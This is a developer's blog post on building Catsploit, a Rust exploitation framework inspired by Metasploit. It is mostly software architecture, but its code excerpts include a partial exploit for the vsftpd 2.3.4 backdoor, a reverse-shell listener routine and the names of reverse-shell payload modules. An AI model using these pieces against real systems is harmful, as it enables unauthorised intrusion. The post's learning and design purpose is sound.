---
layout: post
title: Developing a Metasploit Alternative - Catsploit
categories: markdown
---

In an attempt to build a new open-source cybersecurity tool for my own usage and to build some experience, I developed [Catsploit](https://github.com/mark-ruddy/catsploit). Catsploit is an exploitation framework inspired by [Metasploit](https://github.com/rapid7/metasploit-framework). This post relates to the code itself, especially the modular requirements for an exploit framework, and discusses why Metasploit will probably remain king as the go-to open-source generalist exploit framework for a long time.

## Catsploit development
### Structure

Source code: <https://github.com/mark-ruddy/catsploit>

Catsploit is laid out in a common format of a separate library to application/interface:

```
[main][~/dev/default/catsploit]$ tree -L 2   
.
├── catsploit
│   ├── Cargo.lock
│   ├── Cargo.toml
│   ├── src
│   └── target
├── catsploit_lib
│   ├── Cargo.lock
│   ├── Cargo.toml
│   ├── README.md
│   ├── src
│   └── target
├── LICENSE
└── README.md

7 directories, 7 files
[main][~/dev/default/catsploit]$ 
```

- The `catsploit` directory contains only the code to create the CLI app, such as the user input loop and dealing with setting module options. `catsploit` interacts with the `catsploit_lib` library
- The `catsploit_lib` directory contains the library. `catsploit_lib` contains the functional code for carrying out tasks with Catsploit. For example the `Exploit` trait and also the individual modules such as the `Vsftpd234Backdoor` exploit

This structure of a split between the CLI app and the library allows other custom applications to hook into `catsploit_lib` and use its functionality. For example an `axum` server could be written in the future to allow calling of `catsploit_lib` code from a website.

#### Separate library and application

During local development, the `Cargo.toml` of the application that is hooking into the library can be set to `path`. When hosting the crate of the application on [crates.io](https://crates.io/) though, it must be a version number that is another crate hosted on crates.io:

```
[dependencies]
# NOTE: when doing local development on CLI with changes to library, can change dependency to path instead of crates.io version
catsploit_lib = { path = "../catsploit_lib" }
# catsploit_lib = "0.1.0"
```

### The library
The library consists of all relevant code that is not related directly to user interaction - exploits, payloads, auxiliary modules etc:

```
[main][~/dev/default/tirax_lab/catsploit/catsploit_lib/src]$ tree .
.
├── core
│   ├── auxiliary.rs
│   ├── exploit
│   │   └── remote_tcp.rs
│   ├── exploit.rs
│   ├── handler
│   │   └── generic_tcp_handler.rs
│   ├── handler.rs
│   ├── opt.rs
│   ├── payload
│   │   └── reverse.rs
│   └── payload.rs
├── core.rs
├── lib.rs
├── module
│   ├── auxiliary
│   │   ├── osint
│   │   │   └── my_ip.rs
│   │   └── osint.rs
│   ├── auxiliary.rs
│   ├── exploit
│   │   ├── ftp
│   │   │   └── vsftpd_234_backdoor.rs
│   │   └── ftp.rs
│   ├── exploit.rs
│   ├── index.rs
│   ├── payload
│   │   ├── linux_shell
│   │   │   └── nc_mkfifo_reverse_tcp.rs
│   │   ├── linux_shell.rs
│   │   ├── ruby
│   │   │   └── ruby_reverse_tcp.rs
│   │   └── ruby.rs
│   └── payload.rs
├── module.rs
├── util
│   └── gen.rs
└── util.rs

14 directories, 25 files
[main][~/dev/default/tirax_lab/catsploit/catsploit_lib/src]$
```

#### Library core and traits

In `core` we have the logic that defines how the framework works - which are primarily defined with [Rust Traits](https://doc.rust-lang.org/book/ch10-02-traits.html). For example in `exploit.rs` we have the `Exploit` trait:

```rust
pub trait Exploit {
    fn default() -> Self
    where
        Self: Sized;

    fn kind(&self) -> Kind;

    fn ranking(&self) -> Ranking {
        Ranking::Average
    }

    fn payload_compat(&self) -> PayloadCompat {
        PayloadCompat::default()
    }

    fn info(&self) -> Info;

    // TODO: does payload need to be borrowed box?
    #[allow(clippy::borrowed_box)]
    fn exploit(&self, payload: &Box<dyn Payload + Send + Sync>) -> Result<(), Box<dyn Error>>;

    fn opts(&self) -> Option<Vec<Opt>> {
        None
    }

    fn apply_opts(&mut self, opts: Vec<Opt>) -> Result<(), Box<dyn Error>>;
}
```

In this code we define the required methods/functions(see [Associated Functions](https://doc.rust-lang.org/book/ch05-03-method-syntax.html#associated-functions)) that a type must have to be able to implement `Exploit`. Rust Traits are very similar to Go's [Interfaces](https://gobyexample.com/interfaces), with the primary difference being that a Rust type will only implement a trait if its defined explicitly `impl Trait for MyStruct`, while a Go type will implicitly implement an interface if it happens to have all of the method signatures defined on itself.

Metasploit on the other hand is written in Ruby, which is probably the most OOP language I've ever worked with(I don't really know how to phrase that), with its "everything is an object" philosophy. It uses OOP inheritance to accomplish defining an exploit:

```ruby
###
#
# The exploit class acts as the base class for all exploit modules.  It
# provides a common interface for interacting with exploits at the most basic
# level.
#
###
class Exploit < Msf::Module

##
  # Exceptions
  ##

  # Indicate that the exploit should abort because it has completed
  class Complete < RuntimeError
  end

  # Indicate that the exploit should abort because it has failed
  class Failed < RuntimeError
  end
...
```

A specific exploit will inherit from the base `Exploit` class, which itself inherits from `Msf::Module`. The Rust/Go approach could be described as compisition while Ruby uses inheritance. For this use-case of defining what all exploits must be able to do, I think both ways are good solutions.

The reason that an `Exploit` trait/class/interface is needed for an exploit framework is so that it can be modular. New exploits are released everyday, and an exploit framework will require a lot of logic to index them, run them, etc. There must be a common interface defined for this so that the a new exploit can be slotted in.

#### From a trait to a working module
A new exploit can now be added to the framework by adding a single file, for example [vsftpd_234_backdoor.rs](https://github.com/mark-ruddy/catsploit/blob/main/catsploit_lib/src/module/exploit/ftp/vsftpd_234_backdoor.rs).

In this Rust file, we define a struct on which we define the exploits options and any extra types it needs to complete its work:

```rust
pub struct Vsftpd234Backdoor {
    pub remote_tcp: RemoteTcp,
    pub backdoor_port: Option<String>,
}
```

[remote_tcp.rs](https://github.com/mark-ruddy/catsploit/blob/main/catsploit_lib/src/core/exploit/remote_tcp.rs) in the `core` of the library provides a type that has functions for opening TCP connections. This is another element of the `core` code apart from Traits, extra types that can be shared throughout modules.

In the `vsftpd_234_backdoor.rs` file, we can then add whatever extra code we need and importantly explicitly implement the `Exploit` trait for the `Vsftpd234Backdoor` type:

```rust
impl Exploit for Vsftpd234Backdoor {
  ...
    fn exploit(
        &self,
        payload: &Box<dyn Payload + Send + Sync>,
    ) -> Result<(), Box<dyn std::error::Error>> {
        self.attempt_backdoor(payload.clone(), false)?;

        let mut stream = self.remote_tcp.connect()?;
        let mut stream_buf = BufReader::new(stream.try_clone()?);

        let mut banner_resp = String::new();
        stream_buf.read_line(&mut banner_resp)?;
        info!("Banner returned from server: {}", banner_resp);

        let user_hash = random_alphanumeric(6);
        stream.write_all(format!("USER {}:)\r\n", user_hash).as_bytes())?;
        let mut user_hash_resp = String::new();
        stream_buf.read_line(&mut user_hash_resp)?;
        info!("Response to user hash: {}", user_hash_resp);

        if user_hash_resp.contains("530") {
            return Err(
                "Server is configured for anonymous only and the backdoor code cannot be reached"
                    .into(),
            );
        }

        if !user_hash_resp.contains("331") {
            return Err(
                "Server is not responding as expected, response should contain 331 code".into(),
            );
        }
  ...
```

With this we have a solid system for defining shared types(like `RemoteTcp`) and shared traits(like `Exploit`) that modules can easily implement. The `vsftpd_234_backdoor.rs` code only contains code directly relevant to the exploit itself and its options. This allows new contributors to open up a PR for a new exploit by slotting in a single file with the exploit code. Of course they will need to hook it all up into the Trait's methods but that is generally simple enough.

#### Aggregating modules
So now that we have the `Vsftpd234Backdoor` defined, we need some way for applications that use the library to be able to find all the available exploits and use them. This is accomplished with a simple [index.rs](https://github.com/mark-ruddy/catsploit/blob/main/catsploit_lib/src/module/index.rs) that has functions which return a `Vec<Box<dyn Trait>>`:

```rust
pub fn exploits() -> Vec<Box<dyn Exploit>> {
    vec![Box::new(Vsftpd234Backdoor::default())]
}

pub fn payloads() -> Vec<Box<dyn Payload + Send + Sync>> {
    vec![
        Box::new(RubyReverseTcp::default()),
        Box::new(NcMkfifoReverseTcp::default()),
    ]
}

pub fn auxiliary() -> Vec<Box<dyn Auxiliary + Send + Sync>> {
    vec![Box::new(MyIp::default())]
}
```

An application can now call these indexing functions and can then do work with the vectors.

#### Using modules concurrently

Note how Payload and Auxiliary have the `+ Send + Sync` traits specified when stored in the vector, this is due to them commonly requiring to be called inside threads like such:

```rust
if payload.needs_pretask() {
    handle = Some(thread::spawn(move || -> Result<(), String> {
        payload.pretask().map_err(|e| format!("{}", e))
    }));
}
```

An example of a pretask, opening up a listener for a reverse shell connection:

```rust
fn pretask(&self) -> Result<(), Box<dyn std::error::Error>> {
    let mut handler = GenericTcpHandler::new("0.0.0.0", &self.reverse.lport)?;
    handler.listen_for_one(false)?;
    Ok(())
}
```

Another thread is required when using this payload so that the reverse shell listener pretask does not block the rest of the exploit code from running.

### The CLI application
The CLI application hooks into the `catsploit_lib` library and uses it to provide an interactive CLI program. Metasploit have a similar approach to this(but more advanced, framework can connect to databases etc.), where the `msfconsole` is separate from the `metasploit-framework`.

It provides a simple, interactive loop for the user to interact with:

```
[~]$ catsploit

 ________  ________  _________  ________  ________  ___       ________  ___  _________   
|\   ____\|\   __  \|\___   ___\\   ____\|\   __  \|\  \     |\   __  \|\  \|\___   ___\ 
\ \  \___|\ \  \|\  \|___ \  \_\ \  \___|\ \  \|\  \ \  \    \ \  \|\  \ \  \|___ \  \_| 
 \ \  \    \ \   __  \   \ \  \ \ \_____  \ \   ____\ \  \    \ \  \\\  \ \  \   \ \  \  
  \ \  \____\ \  \ \  \   \ \  \ \|____|\  \ \  \___|\ \  \____\ \  \\\  \ \  \   \ \  \ 
   \ \_______\ \__\ \__\   \ \__\  ____\_\  \ \__\    \ \_______\ \_______\ \__\   \ \__\
    \|_______|\|__|\|__|    \|__| |\_________\|__|     \|_______|\|_______|\|__|    \|__|
                                  \|_________|                                           
            
---------------------
 Module Type  Loaded 
---------------------
 Exploits     1 
---------------------
 Payloads     2 
---------------------
catsploit> show payloads
+---+-------------------------------------------+---------------------------+--------------+
| # | Module Path                               | Name                      | Kind         |
+---+-------------------------------------------+---------------------------+--------------+
| 0 | payload/ruby/reverse_tcp                  | Ruby Reverse TCP          | ReverseShell |
+---+-------------------------------------------+---------------------------+--------------+
| 1 | payload/linux_shell/nc_mkfifo_reverse_tcp | Netcat Mkfifo Reverse TCP | ReverseShell |
+---+-------------------------------------------+---------------------------+--------------+
catsploit> use 0
catsploit (payload/ruby/reverse_tcp)> info   
+------------------+--------------------------+--------------+
| Name             | Module Path              | Kind         |
+------------------+--------------------------+--------------+
| Ruby Reverse TCP | payload/ruby/reverse_tcp | ReverseShell |
+------------------+--------------------------+--------------+
+-------+---------------+---------+---------+
| Name  | Description   | Default | Current |
+-------+---------------+---------+---------+
| LHOST | Listener host | 0.0.0.0 | 0.0.0.0 |
+-------+---------------+---------+---------+
| LPORT | Listener port | 9092    | 9092    |
+-------+---------------+---------+---------+
catsploit (payload/ruby/reverse_tcp)> set LHOST 192.168.1.1
```

#### Interactive CLI
An interactive CLI is relatively simple to implement. The complexity comes from holding state(e.g. Which exploit has the user currently selected? What options have they set to what values?).

The below code in the `main` function of the CLI app is enough to provide the interactive CLI loop:

```rust
fn main() -> Result<(), Box<dyn Error>> {
    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();

    let mut cli = Cli::default();
    cli.print_banner();
    cli.print_module_stats();
    loop {
        cli.print_prompt();
        io::stdout().flush()?;

        let user_input = match cli.get_user_input() {
            Ok(user_input) => user_input,
            Err(e) => {
                println!("{}", e);
                continue;
            }
        };
        match cli.handle_input(user_input) {
            Ok(prompt_change) => prompt_change,
            Err(e) => {
                println!("{}", e);
                continue;
            }
        };
    }
}
```

#### Holding CLI state in memory

The approach I've chosen for this is something close to OOP, which in Rust's case is a struct type with methods defined on it. The `Cli` struct is defined with all the state it needs, with all of them put inside `Option` so they can each be `None` or `Some(T)`:

```rust
pub struct Cli {
    pub prompt: Option<String>,
    pub selected_module_kind: Option<Kind>,
    pub selected_module_path: Option<String>,
    pub selected_module_opts: Option<Vec<Opt>>,
    pub previous_module_opts: HashMap<String, Vec<Opt>>,
    pub displayed_list: HashMap<usize, String>,

    pub auxiliary: Option<Box<dyn Auxiliary + Send + Sync>>,
    pub auxiliary_info: Option<auxiliary::Info>,

    pub exploit: Option<Box<dyn Exploit>>,
    pub exploit_info: Option<exploit::Info>,
    pub exploit_payload: Option<Box<dyn Payload + Send + Sync>>,

    pub payload: Option<Box<dyn Payload + Send + Sync>>,
    pub payload_info: Option<payload::Info>,
}

```

Then the `Cli` struct is used in a lot of different methods that take it as `&mut self`. This is a mutable reference to the instance/object of the `Cli` struct. Each of the below called methods can update the state of the `Cli`, change a value like `exploit_info` to `None` or `Some(exploit::Info)` and so on:

```rust
impl Cli {
  ...
    pub fn handle_input(&mut self, input: UserInput) -> Result<(), Box<dyn Error>> {
        match input.cmd.as_str() {
            "modules" => self.print_module_stats(),
            "show" => self.handle_show(input.subcmd)?,
            "info" => self.handle_info(input.subcmd)?,
            "use" => self.handle_use(input.subcmd)?,
            "set" => self.handle_set(input.subcmd, input.args)?,
            "run" => self.handle_run()?,
            "help" => Cli::handle_help(),
            "exit" => {
                println!("Exiting...");
                process::exit(0);
            }
            _ => {
                if !input.cmd.is_empty() {
                    println!("Unknown command '{}'", input.cmd);
                }
            }
        };
        Ok(())
    }
  ...
```

This provides a concise, in-memory and in-code way of storing state for an application such as this. A mistake I've made in the past is attempting to store state similar to this in parameters and return values instead of inside a struct/class. Both the caller and callee code can become messy quickly and the same parameters may be required for multiple functions:

```rust
fn change_exploits(exploits: Option<Vec<dyn Exploit>>, exploit_info: Option<exploit::Info>, exploit_payload: Option<Box<dyn Payload + Send + Sync>>) -> OptionVec<dyn Exploit>) {
    // do something with exploits and return them
    return Some(updated_exploits)
}

let updated_exploits = change_exploits(...).unwrap()
```

For a system managing hundreds or thousands of pieces of state information, it may make sense to look instead for an out-of-code way of storing it such as SQLite etc. I believe its generally fine to just store state in-memory when its reasonable, and especially when it allows your application to forgo requiring a dependency such as a database.

#### Hooking into the library
The code for hooking into the `catsploit_lib` library is actually very simple:

```rust
use catsploit_lib::module::{index, Kind};

...

pub fn find_exploit(module_path: &str) -> Option<Box<dyn Exploit>> {
    let exploits = index::exploits();
    let mut selected_exploit: Option<Box<dyn Exploit>> = None;
    for exploit in exploits {
        if exploit.info().module_path == module_path {
            selected_exploit = Some(exploit);
        }
    }
    selected_exploit
}
```

In this application-side code the exploit index is from the library is called, and then iterated through to find which one matches a specific module path. With this code the CLI application can grab a specific exploit requested by the user, and then call any of the `Exploit` trait methods on it such as `exploit()` to run it.

From this we can see how this library could be used in any Rust code - for example an `axum` webserver could be written were a user visits a webapp that allows them to view the exploits and run them.

## Exploit frameworks are momentum based
As seen by the description of the code for an exploit framework, it is clear that they rely on modules. Everyday new exploits are developed for new vulnerabilities, new payloads techniques are developed, new scanners, etc. Without an extensive open-source community and full-time employees behind it to write new modules on a regular basis the framework will rapidly become outdated.

When it comes to fuzzing tools for example you have a lot of quality tools to choose from: `ffuf`, `wfuzz`, `fuzzapi`, `boofuzz`, `syzkaller` and you could go on and on. Many of these tools are not super actively developed either, as they often don't need to be, once they're written and tested they can work well for years. This is not the case for exploit frameworks.

For a generalists open-source exploit framework, realistically `metasploit-framework` is the only option. There are a few other closed-source ones such as `CORE IMPACT`, `Immunity CANVAS`, or browser exploitation frameworks such as `BEeF`. 

None of these cover the same breadth of Metasploit though, and I believe it would be nearly impossible to do so - the project has the most momentum in a field that relies on that.

## Conclusion
Catsploit was a fun project to work on and develop, I learned a ton about Rust, Ruby, Exploits, Payloads and more. On reflection though  without constant work the project can never actually be useful to anyone, which is fine :)
